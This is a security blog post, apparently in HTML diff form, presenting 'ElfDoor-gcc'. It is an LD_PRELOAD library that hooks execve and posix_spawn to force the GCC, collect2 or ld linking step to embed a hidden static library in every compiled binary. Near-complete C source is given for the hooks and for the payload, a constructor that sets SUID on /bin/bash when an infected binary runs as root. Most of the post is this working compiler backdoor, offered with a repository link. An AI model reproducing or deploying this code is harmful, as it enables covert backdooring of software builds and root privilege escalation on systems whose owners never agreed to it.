+<h2 id="introduction">Introduction</h2>
+<p>If you&rsquo;ve ever wondered how it&rsquo;s possible to inject malicious code into binaries <strong>without touching the source code</strong>, and using only standard Linux tools, this article is for you. We&rsquo;ll explore a very cool technique that intercepts the compilation process with LD_PRELOAD, modifying the commands executed and forcing the inclusion of a malicious library during <strong>linking</strong>.</p>
+<p>In the end, the compiled binary looks legitimate, but it is infected with embedded malicious code, ready to be executed at the right time.</p>
+<p>This is a simple project, with simple ideas and mechanisms, and it can certainly be improved.</p>
+<p>ElfDoor-gcc repo: <a href="https://github.com/MatheuZSecurity/ElfDoor-gcc">https://github.com/MatheuZSecurity/ElfDoor-gcc</a></p>
+<h2 id="understanding-the-compilation-process-with-gcc">Understanding the Compilation Process with GCC</h2>
+<p>Before attacking the compilation process, it&rsquo;s essential to understand how it works</p>
+<p>GCC functions as more than a basic compiler; it operates as a kind of pipeline manager for multiple internal tools, depending on the requirements:</p>
+<p><code>gcc main.c -o main</code></p>
+<p>This command has a sequence of steps:</p>
+<ol>
+<li>
+<p><strong>Preprocessing (cpp)</strong></p>
+<ul>
+<li>
+<p>Expands macros, includes header files, and removes comments.</p>
+</li>
+<li>
+<p>Generates a .i file containing the &ldquo;expanded&rdquo; source code.</p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Compilation (cc1)</strong></p>
+<ul>
+<li>
+<p>Converts the .i code into assembly.</p>
+</li>
+<li>
+<p>Performs syntax and semantic checks, along with optimizations.</p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Assembly (as)</strong></p>
+<ul>
+<li>Translates the assembly code into an object file (.o).</li>
+</ul>
+</li>
+<li>
+<p><strong>Linkagem (collect2 → ld)</strong></p>
+<ul>
+<li>
+<p>Combines object files, resolves symbols, and produces the final binary.</p>
+</li>
+<li>
+<p>gcc invokes collect2, which in turn calls ld, the actual linker.</p>
+</li>
+</ul>
+</li>
+</ol>
+<p>This final stage <strong>linking</strong>, is where the hijacking occurs. If we manage to intercept the moment when ld is invoked, we can modify its arguments and inject our own malicious library</p>
+<h2 id="attack-chain">Attack Chain</h2>
+<p>The core concept is to leverage LD_PRELOAD to override critical functions like execve and posix_spawn, enabling us to intercept process execution.</p>
+<p>Our project will consist of:</p>
+<ul>
+<li>
+<p><strong>main.c</strong>: Hooks execve and posix_spawn, inspects the arguments, and, if appropriate, injects parameters to include our malicious library.</p>
+</li>
+<li>
+<p><strong>b.a</strong>: The library containing the malicious code we want to embed in the final binary</p>
+</li>
+<li>
+<p><strong>Install.sh</strong>: Compiles and loads our malicious LD_PRELOAD.</p>
+</li>
+<li>
+<p><strong>hello.c</strong>: A simple program that just prints &ldquo;Hello,&rdquo; but after compiling and executing, it will run our malicious code.</p>
+</li>
+</ul>
+<h2 id="elfdoor-hooks">ElfDoor Hooks</h2>
+<p>The <code>main.c</code> file is responsible for hooking process execution functions, such as <code>execve</code> and <code>posix_spawn</code>, to inject a malicious static library called b.a into the binary compilation process. This technique allows any binary generated on a compromised machine to carry a &ldquo;hidden&rdquo; payload without the developer noticing.</p>
+<p>The structure starts with the inclusion of the essential libraries:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#define _GNU_SOURCE
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;dlfcn.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;spawn.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">extern</span> <span class="kt">char</span> <span class="o">**</span><span class="n">environ</span><span class="p">;</span>
+</span></span></code></pre></div><p>The use of <code>_GNU_SOURCE</code> is essential to enable GNU libc specific extensions, such as the interception of <code>execve</code> and <code>posix_spawn</code>. Including <code>&lt;dlfcn.h&gt;</code> allows the use of dlsym, which is crucial for obtaining pointers to the original functions and diverting execution.</p>
+<p>Next, we have auxiliary functions responsible for determining if the running binary is relevant. For example, <code>is_gcc</code> detects whether the binary being executed is the <code>GCC</code>, <code>cc</code>, or <code>clang</code> compiler:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">is_gcc</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">path</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">progname</span> <span class="o">=</span> <span class="nf">strrchr</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="sc">&#39;/&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">progname</span> <span class="o">=</span> <span class="n">progname</span> <span class="o">?</span> <span class="n">progname</span> <span class="o">+</span> <span class="mi">1</span> <span class="o">:</span> <span class="n">path</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">strcmp</span><span class="p">(</span><span class="n">progname</span><span class="p">,</span> <span class="s">&#34;gcc&#34;</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">||</span> <span class="nf">strcmp</span><span class="p">(</span><span class="n">progname</span><span class="p">,</span> <span class="s">&#34;cc&#34;</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">||</span> <span class="nf">strcmp</span><span class="p">(</span><span class="n">progname</span><span class="p">,</span> <span class="s">&#34;clang&#34;</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>The code above extracts the program name from the full path (e.g., /usr/bin/gcc) and directly compares it with known compiler names. The same pattern is used to identify <code>collect2</code> and <code>ld</code> in the <code>is_collect2</code> and <code>is_linker</code> functions.</p>
+<p>Then, the <code>should_inject</code> function determines whether the injection should occur, based on the compiler arguments:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">should_inject</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="k">const</span> <span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">argv</span><span class="p">[</span><span class="n">i</span><span class="p">];</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nf">strcmp</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="s">&#34;-c&#34;</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">||</span> <span class="nf">strcmp</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="s">&#34;-E&#34;</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">||</span> <span class="nf">strcmp</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="s">&#34;-S&#34;</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>These flags (-c, -E, -S) are used in intermediate compilation processes that do not generate final executables. Since the goal is to inject code into the final binary, these modes are ignored.</p>
+<p>The most important function is <code>inject_args</code>, which constructs a new argument list by inserting the static library:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">char</span> <span class="o">**</span><span class="nf">inject_args</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">bin_path</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="k">const</span> <span class="n">argv</span><span class="p">[],</span> <span class="kt">int</span> <span class="n">extra</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">argc</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="n">argc</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">argv</span><span class="p">[</span><span class="n">argc</span><span class="p">];</span> <span class="o">++</span><span class="n">argc</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">lib_path</span> <span class="o">=</span> <span class="s">&#34;/dev/shm/b.a&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">argc</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nf">strstr</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="s">&#34;b.a&#34;</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">new_argv</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="o">*</span> <span class="p">(</span><span class="n">argc</span> <span class="o">+</span> <span class="n">extra</span> <span class="o">+</span> <span class="mi">1</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">new_argv</span><span class="p">)</span> <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">argc</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">new_argv</span><span class="p">[</span><span class="n">j</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">arg1</span><span class="p">,</span> <span class="o">*</span><span class="n">arg2</span><span class="p">,</span> <span class="o">*</span><span class="n">arg3</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">is_gcc</span><span class="p">(</span><span class="n">bin_path</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">arg1</span> <span class="o">=</span> <span class="s">&#34;-Wl,--whole-archive&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">arg2</span> <span class="o">=</span> <span class="n">lib_path</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">arg3</span> <span class="o">=</span> <span class="s">&#34;-Wl,--no-whole-archive&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">arg1</span> <span class="o">=</span> <span class="s">&#34;--whole-archive&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">arg2</span> <span class="o">=</span> <span class="n">lib_path</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">arg3</span> <span class="o">=</span> <span class="s">&#34;--no-whole-archive&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">new_argv</span><span class="p">[</span><span class="n">j</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">arg1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">new_argv</span><span class="p">[</span><span class="n">j</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">arg2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">new_argv</span><span class="p">[</span><span class="n">j</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">arg3</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">new_argv</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="kt">char</span> <span class="o">**</span><span class="p">)</span><span class="n">new_argv</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>The <code>inject_args</code> function modifies a program&rsquo;s argument list by conditionally adding a static library (/dev/shm/b.a), depending on the binary, and prevents duplication of this library in the list.</p>
+<p>The hooking of <code>execve</code> happens as follows:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">execve</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">pathname</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="k">const</span> <span class="n">argv</span><span class="p">[],</span> <span class="kt">char</span> <span class="o">*</span><span class="k">const</span> <span class="n">envp</span><span class="p">[])</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">static</span> <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">real_execve</span><span class="p">)(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="k">const</span> <span class="p">[],</span> <span class="kt">char</span> <span class="o">*</span><span class="k">const</span> <span class="p">[])</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">real_execve</span><span class="p">)</span> <span class="n">real_execve</span> <span class="o">=</span> <span class="nf">dlsym</span><span class="p">(</span><span class="n">RTLD_NEXT</span><span class="p">,</span> <span class="s">&#34;execve&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">((</span><span class="nf">is_gcc</span><span class="p">(</span><span class="n">pathname</span><span class="p">)</span> <span class="o">||</span> <span class="nf">is_collect2</span><span class="p">(</span><span class="n">pathname</span><span class="p">)</span> <span class="o">||</span> <span class="nf">is_linker</span><span class="p">(</span><span class="n">pathname</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="nf">should_inject</span><span class="p">(</span><span class="n">argv</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">char</span> <span class="o">**</span><span class="n">new_argv</span> <span class="o">=</span> <span class="nf">inject_args</span><span class="p">(</span><span class="n">pathname</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="mi">3</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">new_argv</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="kt">int</span> <span class="n">result</span> <span class="o">=</span> <span class="nf">real_execve</span><span class="p">(</span><span class="n">pathname</span><span class="p">,</span> <span class="n">new_argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">free</span><span class="p">(</span><span class="n">new_argv</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">real_execve</span><span class="p">(</span><span class="n">pathname</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>When the process attempts to execute <code>gcc</code>, <code>ld</code>, or similar, the <code>execve</code> hook intercepts the call. It calls the <code>inject_args</code> function to modify the arguments, and if the modification is successful, it executes the binary with the new argument list. The original <code>execve</code> function is called via the pointer obtained with dlsym, ensuring that the actual call still happens, but with the malicious code included.</p>
+<p>Finally, the <code>posix_spawn</code> function is handled with identical logic:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">posix_spawn</span><span class="p">(</span><span class="kt">pid_t</span> <span class="o">*</span><span class="n">pid</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">path</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="k">const</span> <span class="kt">posix_spawn_file_actions_t</span> <span class="o">*</span><span class="n">file_actions</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="k">const</span> <span class="kt">posix_spawnattr_t</span> <span class="o">*</span><span class="n">attrp</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                <span class="kt">char</span> <span class="o">*</span><span class="k">const</span> <span class="n">argv</span><span class="p">[],</span> <span class="kt">char</span> <span class="o">*</span><span class="k">const</span> <span class="n">envp</span><span class="p">[])</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">static</span> <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">real_posix_spawn</span><span class="p">)(</span><span class="kt">pid_t</span> <span class="o">*</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                                   <span class="k">const</span> <span class="kt">posix_spawn_file_actions_t</span> <span class="o">*</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                                   <span class="k">const</span> <span class="kt">posix_spawnattr_t</span> <span class="o">*</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                                   <span class="kt">char</span> <span class="o">*</span><span class="k">const</span> <span class="p">[],</span> <span class="kt">char</span> <span class="o">*</span><span class="k">const</span> <span class="p">[])</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">real_posix_spawn</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">real_posix_spawn</span> <span class="o">=</span> <span class="nf">dlsym</span><span class="p">(</span><span class="n">RTLD_NEXT</span><span class="p">,</span> <span class="s">&#34;posix_spawn&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">((</span><span class="nf">is_gcc</span><span class="p">(</span><span class="n">path</span><span class="p">)</span> <span class="o">||</span> <span class="nf">is_collect2</span><span class="p">(</span><span class="n">path</span><span class="p">)</span> <span class="o">||</span> <span class="nf">is_linker</span><span class="p">(</span><span class="n">path</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="nf">should_inject</span><span class="p">(</span><span class="n">argv</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">char</span> <span class="o">**</span><span class="n">new_argv</span> <span class="o">=</span> <span class="nf">inject_args</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="mi">3</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">new_argv</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="kt">int</span> <span class="n">result</span> <span class="o">=</span> <span class="nf">real_posix_spawn</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="n">file_actions</span><span class="p">,</span> <span class="n">attrp</span><span class="p">,</span> <span class="n">new_argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">free</span><span class="p">(</span><span class="n">new_argv</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nf">real_posix_spawn</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="n">file_actions</span><span class="p">,</span> <span class="n">attrp</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>This hook ensures that even when <code>gcc</code> or <code>ld</code> use <code>posix_spawn</code> internally, the malicious library will still be injected. It is a layer of compatibility that makes the our malware even more effective.</p>
+<p>The entire mechanism is activated when the library compiled with this <code>main.c</code> is loaded via LD_PRELOAD, a legitimate Linux feature used to replace functions from standard libraries. Any compilation performed on the system can be automatically compromised.</p>
+<h2 id="malicious-code-bc">Malicious code: b.c</h2>
+<p>The purpose of the b.c code is to modify the permissions of <code>/bin/bash</code> to allow it to be executed with elevated privileges.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">__attribute__</span><span class="p">((</span><span class="n">constructor</span><span class="p">))</span> 
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">backdoor</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">chmod</span><span class="p">(</span><span class="s">&#34;/bin/bash&#34;</span><span class="p">,</span> <span class="mo">04755</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>In other words, as soon as some code is compiled using GCC, for example, it will inject our backdoor inside, and if executed as root, it will set the <code>SUID</code> on <code>/bin/bash</code>.</p>
+<h2 id="poc">POC</h2>
+<p><img src="https://i.imgur.com/ZSM4udM.png" alt="imgur"></p>
+<h2 id="conclusion">Conclusion</h2>
+<p>With this simple hook, we’re able to intercept GCC’s compilation pipeline and inject a malicious library during the linking stage, all without modifying the source code.</p>
+<p>The result is a seemingly legitimate binary that silently carries a hidden payload, ready to be executed.</p>
+<p>Please feel free to contact me on <a href="https://x.com/MatheuzSecurity">Twitter</a> if you have any questions.</p>
+<p><a href="https://discord.gg/66N5ZQppU7">Rootkit Researchers</a></p>
+
+  </div>
+
+  <footer class="art-foot">
+    <nav class="navlinks"><a class="prev" href="/hacking/ftrace-rootkit/"><span class="label">&lt;&lt; prev</span><br>Detecting rootkits based on ftrace hooking.</a><a class="next" href="/hacking/bypass-userland-hooks/"><span class="label">next &gt;&gt;</span><br>Bypassing LD_PRELOAD Rootkits Is Easy</a>
+    </nav>
+  </footer>
+</article>
+    </main><footer class="foot">
+    <span>&copy; 2026 <a href="/">0xMatheuZ</a></span>
+    <span>built with <a href="https://gohugo.io/" target="_blank" rel="noopener">hugo</a> · handcrafted layouts</span>
+</footer>
+<script>
+document.querySelectorAll('pre > code').forEach((code) => {
+    const pre = code.parentNode;
+    const wrap = pre.parentNode;
+    const btn = document.createElement('button');
+    btn.className = 'copy-code';
+    btn.type = 'button';
+    btn.textContent = 'copy';
+    const done = () => { btn.textContent = 'copied'; setTimeout(() => btn.textContent = 'copy', 1600); };
+    btn.addEventListener('click', () => {
+        navigator.clipboard.writeText(code.textContent).then(done).catch(() => {});
+    });
+    const host = wrap.classList.contains('highlight') ? wrap : pre;
+    host.style.position = 'relative';
+    host.appendChild(btn);
+});
+</script>
+</body>
+</html>
